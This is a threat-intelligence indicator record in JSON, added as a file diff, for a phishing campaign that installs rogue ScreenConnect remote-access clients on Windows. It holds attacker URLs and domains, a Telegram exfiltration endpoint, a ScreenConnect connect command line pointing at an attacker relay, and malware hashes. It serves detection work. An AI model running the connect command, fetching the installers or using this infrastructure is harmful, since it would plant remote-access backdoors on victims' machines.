@@ -1,0 +1,254 @@
+{
+  "malware_family": "Rogue ScreenConnect (screenconnect-abuse RMM cluster)",
+  "threat_actor": "",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "A phishing campaign abuses a legitimate Microsoft Power BI page as the lure and attacker-controlled staging sites to fingerprint victims before downloading rogue ScreenConnect RMM installers from a shared tenant. Persistence is layered: a second ScreenConnect client, the SCAutoFix.ps1 PowerShell script run every two minutes via the SCAutoRepairEvery2Min scheduled task, and the defense-evasion tool HideUL_x64.exe. Staging pages leak victim telemetry to a hardcoded Telegram bot and redirect visitors that fail anti-analysis checks.",
+  "mitre_techniques": [
+    "T1566",
+    "T1219",
+    "T1053.005",
+    "T1059.001",
+    "T1059.003",
+    "T1105",
+    "T1562",
+    "T1204.002"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "file_path",
+      "value": "C:\\Program Files (x86)\\ScreenConnect Client (43773b3da4ccb17b)\\ScreenConnect.ClientService.exe",
+      "context": "Second rogue ScreenConnect client service path, client ID 43773b3da4ccb17b",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "\"C:\\Program Files (x86)\\ScreenConnect Client (43773b3da4ccb17b)\\ScreenConnect.ClientService.exe\" \"?e=Access&y=Guest&h=onthegotree.site&p=8041&s=7ad17b01-6856-4275-bb84-bbb0064f310a&k=BglAAACkAABSU0ExAAgAAAEAAQDp3p94s8LTUXSGsw95o%2fhax9tzlxm9SUKb5jjVBaBJ4xQPaRxbVOTsc%2fb0KeVjXrTej2%2fL9lV3MCHfhMNs1HZxupKBilsPFSs0hCZf0BoN%2fRY4nHD%2bxVs1qhGM8W%2ffDkqyyXNkqx5qpOYfVc188TSLbngTShSy0bB3Ogd2Rq5ptB3CS28z4tdgy6mNfCHze2ObIwSgpbexupH2sl4vZmCSGh7Y1qdbjWBMuFBCLY121R9%2fDh2n%2bKsdw7OOdDIfgZR6hjWzNLrmCwTew...",
+      "context": "Parent process SYSTEM; ScreenConnect client connect command observed in EDR telemetry",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "2b302081e9e777d0",
+      "context": "Client ID of the initial rogue ScreenConnect client",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "43773b3da4ccb17b",
+      "context": "Client ID of the secondary rogue ScreenConnect client",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "HideUL_x64.exe",
+      "context": "Defense evasion tool executed after rogue RMM deployment to hide activity",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "scheduled_task",
+      "value": "SCAutoRepairEvery2Min",
+      "context": "Scheduled task configured to run SCAutoFix.ps1 every two minutes",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "SCAutoFix.ps1",
+      "context": "PowerShell script deployed from temp dir, downloads second RMM installer and uninstalls first client",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "LyN03DvVjUKPrun.cmd",
+      "context": "Malicious CMD file executed by the initial rogue ScreenConnect client",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Temp\\ScreenConnect.ClientSetup.msi",
+      "context": "Additional RMM installer downloaded by SCAutoFix.ps1",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\ScreenConnect.ClientSetup (6).exe",
+      "context": "Saved file where the downloaded second-stage MSI installer was observed",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "ScreenConnect.ClientSetup.exe",
+      "context": "Rogue RMM installer downloaded from hamham27.screenconnect.com",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Reference Verification Form downloaded successfully",
+      "context": "Fake notification displayed to victims on the staging page",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "TELEGRAM_BOT_TOKEN",
+      "context": "JS variable holding hardcoded Telegram bot credential in main.js",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "url",
+      "value": "https://app.powerbi.com/view?r=eyJrIjoiNTk0NmViNDktYzM1Yy00MjEwLTkyZTctNGU5ZTJmYzMzYjEwIiwidCI6IjU1YTI4YmU2LTFiYzQtNDIzMS05MTA0LTdkMmFlYTVmMGZhNiJ9",
+      "context": "Phishing lure hosted on legitimate Power BI domain",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://dailylifeproject.site/S/",
+      "context": "Payload staging landing page performing victim fingerprinting",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://burnsworth.site/S/main.html",
+      "context": "Staging page restricting access to Windows desktops and filtering ISPs",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://essaywritingservice.site/S/main.html",
+      "context": "Payload staging page observed in other incidents",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://openpediatrics.site/S/main.html",
+      "context": "Payload staging page observed in other incidents",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://check.vykyn.click/E/",
+      "context": "Redirect target for visitors failing anti-analysis checks",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://hamham27.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&t=ILEAYEASAN",
+      "context": "Rogue ScreenConnect installer download; guest token varies (PERFECTO, PAPASUPE)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://onthegotree.site/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest",
+      "context": "Second RMM installer downloaded by SCAutoFix.ps1",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "instance-g01s1n-relay.screenconnect.com",
+      "context": "Relay infrastructure for the initial rogue ScreenConnect client",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "onthegotree.site",
+      "context": "Infrastructure associated with the secondary rogue ScreenConnect client",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage",
+      "context": "Telegram Bot API endpoint used to report victim telemetry",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "5956f9afb3ba610c38b2cfda88dd15be98783963769a12020c93ce05e749b3c3",
+      "description": "Initial rogue ScreenConnect client (client ID 2b302081e9e777d0)"
+    },
+    {
+      "sha256": "f048400c23add8c75abe189393d33c873c02c74eeaf43d47b950c8d643763b35",
+      "description": "Secondary rogue ScreenConnect client (client ID 43773b3da4ccb17b)"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "script"
+  ]
+}
